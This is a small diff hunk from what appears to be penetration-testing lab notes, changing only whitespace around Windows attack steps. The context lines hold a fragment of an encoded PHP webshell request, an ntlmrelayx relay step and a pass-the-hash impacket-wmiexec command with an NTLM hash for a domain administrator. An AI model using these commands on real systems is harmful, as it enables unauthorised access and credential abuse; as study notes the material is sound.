@@ -722,7 +722,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     ```
   - receive an incoming connection in our ntlmrelayx tab
 - Windows credential guard  
-  - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
+  - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)  
     `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`  
 
 # Remote to other machines
